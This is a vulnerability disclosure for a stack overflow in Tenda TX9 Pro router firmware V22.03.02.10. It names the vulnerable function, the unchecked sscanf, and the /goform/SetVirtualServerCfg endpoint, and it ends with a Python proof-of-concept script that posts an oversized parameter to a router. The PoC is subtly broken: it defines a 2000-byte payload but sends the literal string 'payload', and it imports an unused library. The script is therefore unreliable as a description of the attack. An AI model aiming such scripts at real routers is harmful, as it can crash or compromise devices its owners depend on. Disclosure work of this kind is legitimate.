## Overview

- Firmware download website: https://www.tendacn.com/download/detail-4219.html

## Affected version

TX9 Pro Firmware  V22.03.02.10

## Vulnerability details

The Tenda TX9 Pro Firmware  V22.03.02.10 firmware has a stack overflow vulnerability in the `sub_42CB94` function. The `v3` variable receives the `list` parameter from a POST request. However, since the user can control the input of `list`, the statement `if ( sscanf(v3, "%[^,],%[^,],%[^,],%s", v12, v11, v10, v9) == 4 )` can cause a buffer overflow. The user-provided  `list` can exceed the capacity of the `v9~v12` array, triggering this security vulnerability.

![image-20240416113633159](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416113633159.png)

![image-20240416113621650](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416113621650.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetVirtualServerCfg"
payload = b"a"*2000

data = {
        'list':'payload',
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240416113543395](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416113543395.png)
